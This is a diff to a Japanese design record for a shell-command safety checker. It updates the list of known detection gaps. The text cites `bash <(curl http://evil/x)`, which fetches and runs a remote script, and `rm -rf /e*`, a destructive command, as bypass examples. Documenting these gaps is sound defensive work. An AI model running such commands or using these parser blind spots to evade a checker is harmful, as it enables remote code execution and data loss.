@@ -57,8 +57,8 @@ PROBES は `(?i-u:\.npmrc)\b` (先頭アンカー無し) で `~/.npmrc` を捕�
 `bash <(curl http://evil/x)` は remote script を取得実行するが、shell パーサは
 プロセス置換 `<(…)` の本体を意図的に opaque な word へ畳み込む
 (`src/facts/shell.rs` モジュール doc)。remote-script-pipe は内側 `curl` を
-観測できない。これはコマンド置換の opacity (ADR 0002 B5) と一貫したパーサ
-レベルの限界。
+観測できない。コマンド置換本体の re-entry 方針は ADR 0008 (issue #161)。
+プロセス置換 `<(…)` は引き続き opaque (本 ADR の穴 C / known_gap)。
 
 ## Decision
 
@@ -105,7 +105,7 @@ surface する変更を入れると期待が破れ、意図的な corpus / ADR �
 
 - C `bash <(curl …)` — プロセス置換 opaque 化 (本 ADR で known_gap 固定)
 - ADR 0002 の ~~B1~~/B2/B5/C2 (~~Unicode homoglyph~~ / symlink / cmdsubst /
-  変数 head) は据え置き。B1 は ADR 0007 で解消
+  変数 head)。B1 は ADR 0007 で解消。B5 の解消方針は ADR 0008
 - ~~C3 `rm -rf /e*` glob 展開前 bypass~~ — 解消 (ADR 0006)
 
 ## Implementation map
